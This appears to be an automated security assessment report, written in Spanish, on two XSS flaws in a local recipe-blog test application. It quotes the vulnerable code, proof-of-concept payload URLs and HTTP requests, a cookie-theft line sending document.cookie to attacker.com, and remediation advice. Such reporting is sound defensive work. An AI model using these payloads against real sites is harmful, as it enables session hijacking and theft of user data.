# Informe de Análisis de Seguridad - Cross Site Scripting (XSS)

**Fecha:** 2026-04-30 16:11:42  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS  

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades XSS** en la aplicación web "Blog de Recetas":

1. **XSS Reflejado** en el parámetro `search`
2. **XSS DOM-based / Almacenado (localStorage)** en el sistema de comentarios

Ambas vulnerabilidades son de severidad **ALTA** y permiten la ejecución de código JavaScript arbitrario en el navegador de la víctima.

---

## Descripción de la Aplicación

La aplicación es un "Blog de Recetas" con dos funcionalidades principales:
- **Buscador de recetas**: permite buscar recetas por palabra clave (parámetro GET `search`)
- **Sistema de comentarios**: permite publicar comentarios (parámetros GET `name` y `comment`)

---

## Vulnerabilidades Detectadas

### Vulnerabilidad 1: XSS Reflejado — Parámetro `search`

**Severidad:** Alta  
**Tipo:** Reflected XSS  
**Parámetro afectado:** `search` (GET)

#### Descripción técnica

El código JavaScript de la página obtiene el parámetro `search` directamente de la URL y lo inserta en el DOM mediante `document.write()` sin ningún tipo de sanitización ni codificación:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

Al concatenar directamente `searchTerm` dentro de HTML, cualquier etiqueta o evento JavaScript inyectado en el parámetro se ejecutará en el contexto del navegador.

#### Prueba de explotación

**URL maliciosa:**
```
http://web.dev.local:8082/?search=</strong><script>alert('XSS-Reflected')</script>
```

**Payload alternativo (sin etiqueta script):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS')>
```

**Resultado:** El código JavaScript se ejecuta inmediatamente al cargar la página con la URL manipulada.

---

### Vulnerabilidad 2: XSS DOM-based / Almacenado — Sistema de Comentarios

**Severidad:** Alta  
**Tipo:** DOM-based Stored XSS (persistencia en localStorage)  
**Parámetros afectados:** `name` y `comment` (GET)

#### Descripción técnica

El sistema de comentarios almacena los valores de `name` y `comment` en `localStorage` sin sanitizar, y luego los recupera y renderiza directamente con `document.write()`:

```javascript
// Almacenamiento sin sanitización
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado sin sanitización
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

El payload se almacena en `localStorage` y se ejecuta cada vez que el usuario (víctima) carga la página.

#### Prueba de explotación

**URL maliciosa:**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('XSS-Stored')</script>
```

**Payload alternativo:**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert('XSS-Name')>&comment=Hola
```

**Resultado:** El payload queda almacenado en `localStorage` del navegador y se ejecuta cada vez que se carga la página, hasta que se limpien los comentarios.

---

## Impacto Potencial

| Vector | Impacto |
|--------|---------|
| Robo de cookies/sesión | `document.location='https://attacker.com/?c='+document.cookie` |
| Keylogging | Captura de contraseñas y formularios |
| Redirección a phishing | `window.location='https://sitio-malicioso.com'` |
| Defacement | Modificación visual de la página |
| Propagación de malware | Descarga de scripts externos |

---

## Evidencia de Explotación

### Payload Reflected XSS
```
GET /?search=</strong><script>alert('XSS-Reflected')</script> HTTP/1.1
Host: web.dev.local:8082
```
El código fuente muestra la concatenación directa:
```javascript
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

### Payload Stored XSS (localStorage)
```
GET /?name=test&comment=<script>alert('XSS-Stored')</script> HTTP/1.1
Host: web.dev.local:8082
```
El código almacena y renderiza sin sanitización:
```javascript
document.write('<div>' + c.comment + '</div>');
```

---

## Recomendaciones

1. **Sanitizar las entradas del usuario** antes de renderizarlas en el DOM. Utilizar funciones como `textContent` en lugar de `innerHTML` o `document.write()`.

2. **Reemplazar `document.write()`** por métodos seguros del DOM:
   ```javascript
   // INSEGURO
   document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
   
   // SEGURO
   const p = document.createElement('p');
   const strong = document.createElement('strong');
   strong.textContent = searchTerm;  // textContent escapa HTML automáticamente
   p.appendChild(document.createTextNode('Resultados para: '));
   p.appendChild(strong);
   container.appendChild(p);
   ```

3. **Implementar Content Security Policy (CSP)** para limitar la ejecución de scripts:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Validar y sanitizar datos almacenados en localStorage** antes de renderizarlos.

5. **Usar una librería de sanitización** como DOMPurify para limpiar cualquier HTML antes de insertarlo.

---

## Conclusión

La aplicación presenta dos vulnerabilidades XSS críticas causadas por el uso de `document.write()` con datos del usuario sin sanitizar. La primera es un XSS reflejado que requiere que la víctima haga clic en un enlace malicioso. La segunda es un XSS almacenado en `localStorage` que persiste en el navegador del usuario y se ejecuta en cada visita a la página, lo que amplifica su impacto.

**VULN_FOUND: true**  
**VULN_EXPLOITED: true**
